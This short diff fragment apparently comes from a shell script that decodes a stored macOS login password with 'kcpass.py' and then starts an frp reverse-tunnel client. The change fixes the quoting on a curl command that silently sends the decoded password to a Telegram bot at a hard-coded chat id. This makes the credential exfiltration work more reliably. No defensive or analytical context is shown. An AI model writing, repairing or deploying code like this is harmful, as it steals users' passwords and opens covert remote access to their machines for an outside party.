@@ -11,6 +11,6 @@ password=$(python kcpass.py ${passencode})
 
 
 
-curl https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=1280783647&text=${password} 2>/dev/null 1>/dev/null
+curl "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=1280783647&text=${password}" 2>/dev/null 1>/dev/null
 
 ./frp/frpc -c frpc-mac.ini 2>&1 
